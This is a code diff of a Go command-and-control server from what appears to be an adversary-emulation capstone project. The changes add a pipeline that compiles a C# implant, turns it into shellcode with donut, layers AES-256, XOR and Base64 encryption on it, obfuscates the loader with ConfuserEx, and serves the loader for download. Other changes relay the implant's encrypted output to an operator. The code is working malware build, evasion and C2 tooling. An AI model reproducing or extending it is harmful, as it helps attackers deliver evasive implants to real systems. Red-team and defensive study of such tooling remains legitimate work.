@@ -53,34 +53,62 @@ func main() {
 func generateImplant(w http.ResponseWriter, r *http.Request) {
 	var cmd *exec.Cmd
 	fmt.Println("Hit, generating shellcode...")
-	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && wsl bash -c '/mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/mnt/f/capstone-adversary-emulation-tool/Implementation/donut/Implant.exe --output:/mnt/f/capstone-adversary-emulation-tool/Implementation/OutputShellcode/implant.bin'")
+	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
+
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && wsl bash -c '/mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/mnt/f/capstone-adversary-emulation-tool/Implementation/donut/Implant.exe --output:/mnt/f/capstone-adversary-emulation-tool/Implementation/OutputShellcode/implant.bin'")
+		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
 	} else {
-		// assuming you have mono csc installed in your path
-		// and that the C# source code is in the current directory
 		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe /mnt/f/capstone-adversary-emulation-tool/Implementation/Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
 	}
 
 	err := cmd.Run()
 
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal("Error: ", err)
+	}
+
+	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
+	fmt.Println("python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
+	} else {
+		cmd = exec.Command("")
+	}
+
+	output, err2 := cmd.Output() // Capture the output of the command
+	if err2 != nil {
+		log.Fatal("Error: ", err2)
+	} else {
+		fmt.Println(string(output)) // Print the output
 	}
 
 	fmt.Println("Shellcode generated, compiling loader...")
-
+	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
 	}
 
-	err2 := cmd.Run()
-	if err2 != nil {
-		log.Fatal(err)
+	err3 := cmd.Run()
+	if err3 != nil {
+		log.Fatal("Error: ", err3)
+	}
+
+	fmt.Println("Encrypting the Loader now...")
+	fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
+	}
+
+	output, err4 := cmd.Output() // Capture the output of the command
+	if err4 != nil {
+		log.Fatal("Error: ", err4)
+	} else {
+		fmt.Println(string(output)) // Print the output
 	}
 
 	fmt.Println("Loader ready, serving for download...")
-	file, err := os.Open("F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe")
+	fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
+	file, err := os.Open("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
@@ -108,6 +136,17 @@ func windowsImplant(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	http.ServeFile(w, r, filepath)
+
+	fmt.Println("Cleaning loader...")
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cleaner.py")
+	}
+
+	err := cmd.Run()
+	if err != nil {
+		log.Fatal("Error: ", err)
+	}
 }
 
 func powerShellImplant(w http.ResponseWriter, r *http.Request) {
@@ -546,56 +585,39 @@ type Output struct {
 	DateFromLast string `json:"DateFromLast"`
 }
 
-// Define a Mutex so that it can store the Output from the implant
-var (
-	outputStorage Output
-	omu           sync.Mutex
-)
+// Define the buffer that will store the XOR encrypted output
+var outputBuffer []byte
+var bufferMutex sync.Mutex
 
 // This method will receive the output from the implant
 func fetchOutput(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
 	// Upon receiving the output, read it and store the body
-	var output Output
 	body, err := ioutil.ReadAll(r.Body)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		return
 	}
 
-	fmt.Println("Received JSON body:", string(body))
+	fmt.Println("Received XOR encrypted output:", string(body))
 
-	// Now we unmarshal the JSON so we can store it in the Output struct
-	err = json.Unmarshal(body, &output)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		return
-	}
-
-	// Again, since we want the server to hold the output, we use a Mutex to save it in memory
-	omu.Lock()
-	outputStorage = output
-	omu.Unlock()
+	// Lock the mutex and save the body in the outputBuffer
+	bufferMutex.Lock()
+	outputBuffer = body
+	bufferMutex.Unlock()
 }
 
 // This method will be for the Operator so that he can actually receive the output from the implant
 func getStoredOutput(w http.ResponseWriter, r *http.Request) {
 	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
-	omu.Lock()
-	output := outputStorage
-	omu.Unlock()
+	bufferMutex.Lock()
+	output := outputBuffer
+	bufferMutex.Unlock()
 
-	// We then marshal this struct into JSON and store it a variable
-	responseData, err := json.Marshal(output)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
+	fmt.Println(string(output))
 
-	fmt.Println(string(responseData))
-
-	// Then we send off the JSON response for the Operator
-	w.Header().Set("Content-Type", "application/json")
-	w.Write(responseData)
+	// Then we send off the XOR encrypted output for the Operator
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Write(output)
 }
